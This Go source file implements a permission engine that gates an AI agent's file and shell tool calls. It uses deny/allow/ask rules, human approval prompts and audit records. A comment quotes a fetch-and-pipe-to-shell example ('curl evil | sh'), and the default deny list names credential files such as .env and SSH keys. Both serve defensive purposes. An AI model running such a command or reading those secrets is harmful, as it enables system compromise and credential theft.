package main

// policy.go — the permission engine. #52 (M3), ADR 0001 §4.6 as re-scoped
// by ADR 0002.
//
// This engine governs the *detached* notebook only. A notebook that mirrors
// a CLI session never reaches here: that CLI executes with its own
// permission model, and P1's approval widget is the surface through which
// its questions are answered. Wiring policy into that path would be a
// second gate on a decision we do not make.
//
// The one line worth reading twice: policy decides what you may **do**, and
// never **where**. Containment is checked by the tools themselves, before
// any of this runs, so there is deliberately no rule syntax that can widen
// a notebook's root. A permissions file is a convenience; it is not a
// capability grant, and a corrupt or hostile one costs extra prompts rather
// than the filesystem.

import (
	"context"
	"encoding/json"
	"fmt"
	"log"
	"os"
	"path/filepath"
	"regexp"
	"strings"
	"time"

	"github.com/google/uuid"
)

type policyVerdict string

const (
	policyDeny  policyVerdict = "deny"
	policyAllow policyVerdict = "allow"
	policyAsk   policyVerdict = "ask"
)

// policyDecision is a verdict plus the rule that produced it. The rule is
// carried rather than re-derived because it is the thing the audit record
// has to name: "denied" is not an audit trail, "denied by read(**/.env)"
// is.
type policyDecision struct {
	Verdict policyVerdict
	Rule    string // empty when nothing matched and the default applied
}

// policyRules is the on-disk shape, and also NotebookMeta.Permissions.
// Evaluation order is deny → allow → ask → default ask.
type policyRules struct {
	Deny  []string `json:"deny,omitempty"`
	Allow []string `json:"allow,omitempty"`
	Ask   []string `json:"ask,omitempty"`
}

// defaultPolicyRules is what a machine with no permissions file gets.
//
// Read is allowed rather than asked because M2 shipped read-only tools on
// exactly that reasoning — a loop that can only look cannot damage
// anything — and because a prompt on every read trains people to approve
// without reading, which costs more safety than it buys.
//
// The denies are secrets only. They are a floor for the common case, not a
// security boundary: a permissions file that parses replaces this list
// wholesale (see loadPolicyRules), because a file that silently has our
// rules OR-ed into it does not say what it does.
func defaultPolicyRules() policyRules {
	return policyRules{
		Deny: []string{
			"read(**/.env)", "read(**/.env.*)",
			"read(**/.git/config)",
			"read(**/id_rsa)", "read(**/id_ed25519)", "read(**/*.pem)",
		},
		Allow: []string{"read(**)", "glob(**)", "grep(**)"},
		Ask:   []string{"write(**)", "edit(**)", "bash(*)"},
	}
}

// ─── Rule syntax ────────────────────────────────────────────────────────

// parsePolicyRule splits `tool(pattern)`. A bare `tool` means every call to
// it: writing `bash(*)` for that is easy to get subtly wrong and easy to
// mistype into something that matches nothing.
func parsePolicyRule(rule string) (tool, pattern string, ok bool) {
	rule = strings.TrimSpace(rule)
	if rule == "" {
		return "", "", false
	}
	open := strings.Index(rule, "(")
	if open < 0 {
		return rule, "*", true
	}
	if !strings.HasSuffix(rule, ")") {
		return "", "", false
	}
	tool = strings.TrimSpace(rule[:open])
	pattern = strings.TrimSpace(rule[open+1 : len(rule)-1])
	if tool == "" || pattern == "" {
		return "", "", false
	}
	return tool, pattern, true
}

// commandSubjectTools are the tools whose subject is a command line rather
// than a path. They match with different glob semantics — see
// matchCommandPattern.
func isCommandSubject(tool string) bool { return tool == "bash" }

// matchPolicyPattern applies the right glob dialect for the tool.
//
// Path patterns use matchGlob, where `*` stops at a separator, because that
// is what `src/*.go` has to mean. Command patterns cannot: `rm -rf *` would
// then fail to match `rm -rf /home/user`, and a deny rule that quietly
// matches nothing is worse than no rule.
func matchPolicyPattern(tool, pattern, subject string) bool {
	if isCommandSubject(tool) {
		return matchCommandPattern(pattern, subject)
	}
	return matchGlob(pattern, subject)
}

func matchCommandPattern(pattern, subject string) bool {
	re, err := regexp.Compile(commandGlobToRegexp(pattern))
	if err != nil {
		return false
	}
	return re.MatchString(subject)
}

func commandGlobToRegexp(pattern string) string {
	var b strings.Builder
	b.WriteString(`\A`)
	for i := 0; i < len(pattern); i++ {
		switch c := pattern[i]; c {
		case '*':
			b.WriteString(`(?s:.*)`)
		case '?':
			b.WriteString(`(?s:.)`)
		default:
			b.WriteString(regexp.QuoteMeta(string(c)))
		}
	}
	b.WriteString(`\z`)
	return b.String()
}

// shellChaining reports whether a command runs more than the one thing it
// appears to run.
//
// This exists because `bash(git diff*)` is a rule a reasonable person
// writes, and `git diff; curl evil | sh` matches it. An allow rule
// authorises a command; a chained command is not that command. Deny is
// deliberately not filtered this way — deny only ever tightens, so it must
// keep matching the chained form.
var shellChaining = regexp.MustCompile("[;&|`\\n\\r>]|\\$\\(")

// invalidRules returns the first rule that cannot be parsed, or "".
func invalidRules(r policyRules) string {
	for _, list := range [][]string{r.Deny, r.Allow, r.Ask} {
		for _, rule := range list {
			if _, _, ok := parsePolicyRule(rule); !ok {
				return rule
			}
		}
	}
	return ""
}

// ─── Evaluation ─────────────────────────────────────────────────────────

func (r policyRules) decide(tool, subject string) policyDecision {
	if rule, ok := r.firstMatch(r.Deny, tool, subject, false); ok {
		return policyDecision{Verdict: policyDeny, Rule: rule}
	}
	if rule, ok := r.firstMatch(r.Allow, tool, subject, true); ok {
		return policyDecision{Verdict: policyAllow, Rule: rule}
	}
	if rule, ok := r.firstMatch(r.Ask, tool, subject, false); ok {
		return policyDecision{Verdict: policyAsk, Rule: rule}
	}
	// ADR §4.6: an unmatched call always asks. It names no rule because
	// there is none — an audit record must not imply a rule authorised
	// something the default did.
	return policyDecision{Verdict: policyAsk}
}

func (r policyRules) firstMatch(rules []string, tool, subject string, loosening bool) (string, bool) {
	for _, rule := range rules {
		rt, pattern, ok := parsePolicyRule(rule)
		if !ok || rt != tool {
			continue
		}
		if loosening && isCommandSubject(tool) && shellChaining.MatchString(subject) {
			continue
		}
		if matchPolicyPattern(tool, pattern, subject) {
			return rule, true
		}
	}
	return "", false
}

// mergePolicy combines the machine's rules with a notebook's own.
//
// Deny is the union and is evaluated first, so a notebook cannot un-deny
// what the machine denies. That asymmetry is the whole point: a notebook's
// meta is one HTTP PATCH away, and a per-notebook override that could
// delete a global deny would make the global file decorative.
func mergePolicy(global, notebook policyRules) policyRules {
	return policyRules{
		Deny:  concatRules(global.Deny, notebook.Deny),
		Allow: concatRules(notebook.Allow, global.Allow),
		Ask:   concatRules(notebook.Ask, global.Ask),
	}
}

func concatRules(a, b []string) []string {
	if len(a) == 0 {
		return b
	}
	if len(b) == 0 {
		return a
	}
	out := make([]string, 0, len(a)+len(b))
	return append(append(out, a...), b...)
}

// ─── Subjects ───────────────────────────────────────────────────────────

// policySubject is the string a rule's pattern is matched against.
//
// For a path-taking tool it is the path *after* containment has resolved
// it, expressed relative to the root. Matching the raw argument instead
// would make `deny read(**/.env)` bypassable by asking for `./.env`, or by
// naming the file by its absolute path — both of which reach the same
// bytes and neither of which looks like the rule.
//
// A path that cannot be contained is returned unchanged. It is about to be
// refused by the tool regardless, and inventing a normalised form for a
// path we could not resolve would be a guess in the one place guessing is
// least welcome.
//
// Where a tool has both — grep takes a pattern and a path — the path wins.
// What a rule about grep needs to gate is which files get read, not which
// words are looked for.
func policySubject(root string, call ToolCall) string {
	if cmd := argString(call.Input, "command"); cmd != "" {
		return cmd
	}
	if p := argString(call.Input, "path"); p != "" {
		abs, err := containedPath(root, p)
		if err != nil {
			return p
		}
		resolvedRoot, err := containedPath(root, ".")
		if err != nil {
			return p
		}
		rel, err := filepath.Rel(resolvedRoot, abs)
		if err != nil {
			return p
		}
		return filepath.ToSlash(rel)
	}
	return argString(call.Input, "pattern")
}

// proposeAlwaysRule is the rule the "always allow" answer would write.
//
// It is a generalisation, and the generalisation is the risk, so the rule
// is shown in the widget before it is written rather than inferred behind
// the user's back. The shape is the narrowest one that is still useful:
// the directory for a path, the program for a command. `write(src/**)`
// answers "yes, work in src" — which is what a person means when they say
// always — while `write(**)` from one edit to one file would not be.
func proposeAlwaysRule(tool, subject string) string {
	subject = strings.TrimSpace(subject)
	if tool == "" || subject == "" {
		return ""
	}
	if isCommandSubject(tool) {
		prog := strings.Fields(subject)[0]
		return fmt.Sprintf("%s(%s *)", tool, prog)
	}
	dir := filepath.ToSlash(filepath.Dir(subject))
	if dir == "." || dir == "/" || dir == "" {
		return fmt.Sprintf("%s(**)", tool)
	}
	return fmt.Sprintf("%s(%s/**)", tool, dir)
}

// ─── The rules file ─────────────────────────────────────────────────────

// permissionsFilePath mirrors configFilePath: same base, sibling file. The
// two are kept apart because config.json is settings a user tweaks and this
// is a security policy — merging them would mean every settings write
// rewrites the permission rules.
func permissionsFilePath() (string, error) {
	base := os.Getenv("XDG_CONFIG_HOME")
	if base == "" {
		home, err := os.UserHomeDir()
		if err != nil {
			return "", err
		}
		base = filepath.Join(home, ".config")
	}
	return filepath.Join(base, "collectif", "permissions.json"), nil
}

// loadPolicyRules reads the rules file, falling back to the shipped
// defaults when there is not a usable one.
//
// A file that parses is the policy in full — the defaults are not OR-ed
// into it. A permissions file that silently carries rules it does not
// contain is a file that does not say what it does, and the cost of the
// alternative is bounded: an unmatched call asks, so a deny a user forgot
// to copy costs a prompt rather than an action.
//
// It is read per run rather than cached. A permission rule edited while the
// server is up has to take effect without a restart, and the file is
// hundreds of bytes.
func loadPolicyRules() policyRules {
	p, err := permissionsFilePath()
	if err != nil {
		return defaultPolicyRules()
	}
	b, err := os.ReadFile(p)
	if err != nil {
		if !os.IsNotExist(err) {
			log.Printf("policy: read %s: %v (using defaults)", p, err)
		}
		return defaultPolicyRules()
	}
	var r policyRules
	if err := json.Unmarshal(b, &r); err != nil {
		// Falling back to an *empty* rule set here would still default to
		// ask, but it would also drop every deny — the one direction a
		// parse error must never move things.
		log.Printf("policy: parse %s: %v (using defaults)", p, err)
		return defaultPolicyRules()
	}
	// A rule that does not parse matches nothing, and a deny that matches
	// nothing is worse than a deny that is absent — the file reads as
	// protection the user does not have. It cannot be refused here (the
	// alternative is a server that will not start over a typo), so it is
	// said out loud instead.
	if bad := invalidRules(r); bad != "" {
		log.Printf("policy: %s: rule %q is not of the form tool(pattern) and matches nothing", p, bad)
	}
	return r
}

// appendAllowRule is what the "always allow" answer commits. It rewrites
// the whole file rather than appending a line because the file is JSON, and
// it is idempotent because the same pattern can be proposed by two calls
// before either is answered.
func appendAllowRule(rule string) error {
	if strings.TrimSpace(rule) == "" {
		return fmt.Errorf("no rule to write")
	}
	if _, _, ok := parsePolicyRule(rule); !ok {
		return fmt.Errorf("%q is not a rule of the form tool(pattern)", rule)
	}
	p, err := permissionsFilePath()
	if err != nil {
		return err
	}
	current := loadPolicyRules()
	for _, existing := range current.Allow {
		if existing == rule {
			return nil
		}
	}
	current.Allow = append(current.Allow, rule)

	if err := os.MkdirAll(filepath.Dir(p), 0o700); err != nil {
		return err
	}
	b, err := json.MarshalIndent(current, "", "  ")
	if err != nil {
		return err
	}
	return os.WriteFile(p, append(b, '\n'), 0o600)
}

// ─── The gate ───────────────────────────────────────────────────────────

// policyApprovalTimeout is how long a question waits before it expires.
// ADR 0001 §4.6's fifteen minutes: long enough to answer after making
// coffee, short enough that a forgotten tab does not pin a run forever.
// A var so tests do not have to wait a quarter of an hour.
var policyApprovalTimeout = 15 * time.Minute

// pendingApproval is one question a run is blocked on. It lives only while
// the run waits; the log holds everything durable about it.
type pendingApproval struct {
	cellID string
	// rule is what an "always allow" answer would append. It is held here
	// rather than taken from the request so that the widget's confirmation
	// and the rule actually written cannot differ, and so a crafted request
	// cannot name a rule of its own.
	rule   string
	answer chan string
}

// policyGate is one prompt cell's permission context: the rules in force,
// where to write the record, and who is waiting.
type policyGate struct {
	st     *notebookStore
	cellID string
	runID  string
	root   string
	rules  policyRules
}

// newPolicyGate resolves the rules for one run.
//
// Read per run rather than per call: a run must not change its mind about
// what is allowed halfway through because someone saved the file, and a
// single tool call answered under two policies would make the audit record
// unreadable.
func newPolicyGate(st *notebookStore, doc *Notebook, cellID, runID string) *policyGate {
	var own policyRules
	if doc.Meta.Permissions != nil {
		own = *doc.Meta.Permissions
	}
	return &policyGate{
		st: st, cellID: cellID, runID: runID, root: doc.Root,
		rules: mergePolicy(loadPolicyRules(), own),
	}
}

// check decides whether a call may run. When it may not, the second return
// is the text the model gets instead — a refusal is a tool result, not a
// failed run, so the model can adapt rather than losing the turn.
//
// preview is the diff the call would produce, or "" for a tool that cannot
// describe itself. It is attached to the question because it is the whole
// reason this decision is better made in a document than in a terminal.
func (g *policyGate) check(ctx context.Context, call ToolCall, preview string) (policyDecision, string) {
	subject := policySubject(g.root, call)
	d := g.rules.decide(call.Name, subject)

	switch d.Verdict {
	case policyAllow:
		// No approval block. The decision still reaches the log, recorded
		// on the tool result it authorised — an extra event per allowed
		// read would bury the document in records of nothing happening.
		return d, ""

	case policyDeny:
		// One record, already resolved: nobody was asked, so a question
		// followed by an answer would be theatre. What matters is that the
		// rule is named — "denied" is not an audit trail, "denied by
		// read(**/.env)" is.
		id := uuid.NewString()
		g.emit(Output{
			Type: OutputApproval,
			Text: fmt.Sprintf("%s was refused by policy.", call.Name),
			Data: map[string]any{
				"approvalId": id, "tool": call.Name, "input": call.Input,
				"resolution": "denied", "rule": d.Rule, "auto": true,
			},
		})
		return d, fmt.Sprintf(
			"Refused: the permission rule %s denies %s here. Nothing was run. "+
				"Tell the user what you wanted to do and why — this rule is theirs to change, not yours.",
			d.Rule, call.Name)
	}

	return g.ask(ctx, call, subject, d, preview)
}

// ask blocks the run on a human.
func (g *policyGate) ask(ctx context.Context, call ToolCall, subject string, d policyDecision, preview string) (policyDecision, string) {
	id := uuid.NewString()
	pa := &pendingApproval{
		cellID: g.cellID,
		rule:   proposeAlwaysRule(call.Name, subject),
		// Buffered so the HTTP handler never blocks on a waiter that has
		// already given up — it has taken the entry out of the registry by
		// then, so the send has nowhere else to go.
		answer: make(chan string, 1),
	}
	g.st.openApproval(id, pa)

	data := map[string]any{"approvalId": id, "tool": call.Name, "input": call.Input}
	if d.Rule != "" {
		data["rule"] = d.Rule
	}
	if pa.rule != "" {
		data["alwaysRule"] = pa.rule
	}
	if preview != "" {
		data["diff"] = preview
	}
	g.emit(Output{
		Type: OutputApproval,
		Text: fmt.Sprintf("Run %s?", call.Name),
		Data: data,
	})

	answer := g.wait(ctx, id, pa)

	resolution := map[string]string{
		"approve": "approved", "always": "approved", "deny": "denied",
	}[answer]
	if resolution == "" {
		resolution = answer // expired or interrupted; recorded as itself
	}
	res := map[string]any{"approvalId": id, "resolution": resolution}
	if answer == "always" {
		res["rule"] = pa.rule
		res["always"] = true
	}
	g.emit(Output{Type: OutputApproval, Data: res})

	if answer == "approve" || answer == "always" {
		// Deliberately no rule on the outcome. `write(**)` is the rule that
		// made this a question; it is not the reason the call ran. A human
		// is, and the approval pair above says so and is paired by id — so
		// naming the ask rule here would read as "allowed by write(**)",
		// which is the one thing that did not happen.
		return policyDecision{Verdict: policyAllow}, ""
	}
	return policyDecision{Verdict: policyDeny, Rule: d.Rule}, g.refusalText(call.Name, answer)
}

func (g *policyGate) refusalText(tool, answer string) string {
	switch answer {
	case "expired":
		return fmt.Sprintf(
			"%s was not run: the permission request went unanswered for %s and expired. "+
				"Nobody denied it — nobody was there. Say what you were about to do so it can be re-run.",
			tool, policyApprovalTimeout)
	case "interrupted":
		return fmt.Sprintf("%s was not run: the run was interrupted while the permission request was open.", tool)
	default:
		return fmt.Sprintf("Denied: a human refused permission to run %s. Nothing was run. "+
			"Do not try to achieve the same thing another way — ask what they would prefer.", tool)
	}
}

// wait resolves the question, or decides that nobody is going to.
//
// The two non-answers are recorded as themselves rather than folded into
// "denied", because the log has to distinguish a person who said no from a
// person who was not there. P1 made the same distinction for the CLI's
// prompts and it is the reason the audit trail is worth having.
func (g *policyGate) wait(ctx context.Context, id string, pa *pendingApproval) string {
	timer := time.NewTimer(policyApprovalTimeout)
	defer timer.Stop()

	select {
	case answer := <-pa.answer:
		return answer
	case <-timer.C:
		return g.giveUp(id, pa, "expired")
	case <-ctx.Done():
		return g.giveUp(id, pa, "interrupted")
	}
}

// giveUp claims the question back. If a handler took it first — answered in
// the microseconds between the timer firing and this line — its answer is
// already on the channel and stands. Recording "expired" over a real
// decision would be the exact failure P1's `expired` case exists to avoid,
// pointed the other way.
func (g *policyGate) giveUp(id string, pa *pendingApproval, why string) string {
	if _, taken := g.st.takeApproval(id); taken {
		return why
	}
	return <-pa.answer
}

func (g *policyGate) emit(o Output) {
	g.st.emitOutput(g.cellID, g.runID, o)
}

// ─── Pending-question registry ──────────────────────────────────────────

// The registry lives on the store rather than in a package-level map
// because its lifetime is the notebook's: closing a notebook must not leave
// a question hanging that a later notebook could answer by id collision.

func (st *notebookStore) openApproval(id string, pa *pendingApproval) {
	st.approvalsMu.Lock()
	defer st.approvalsMu.Unlock()
	if st.approvals == nil {
		st.approvals = map[string]*pendingApproval{}
	}
	st.approvals[id] = pa
}

// takeApproval removes a question and returns it, so exactly one of the
// answering handler and the expiring waiter can ever claim it.
func (st *notebookStore) takeApproval(id string) (*pendingApproval, bool) {
	st.approvalsMu.Lock()
	defer st.approvalsMu.Unlock()
	pa, ok := st.approvals[id]
	if ok {
		delete(st.approvals, id)
	}
	return pa, ok
}

// takeApprovalForCell answers by cell when the client did not send an id.
// The renderer has the id and sends it; this is the compatibility path for
// a page loaded before this build shipped, and it is unambiguous because a
// run blocks on one question at a time.
func (st *notebookStore) takeApprovalForCell(cellID string) (string, *pendingApproval, bool) {
	st.approvalsMu.Lock()
	defer st.approvalsMu.Unlock()
	for id, pa := range st.approvals {
		if pa.cellID == cellID {
			delete(st.approvals, id)
			return id, pa, true
		}
	}
	return "", nil, false
}

// Nothing here needs a shutdown sweep. Releasing a notebook interrupts its
// runs (releaseNotebook → interruptAllRuns), which cancels the context the
// waiter is selecting on, so a blocked question resolves as `interrupted`
// through the same path a user's Stop button uses. A second teardown route
// would be a second place for the resolution to be recorded differently.
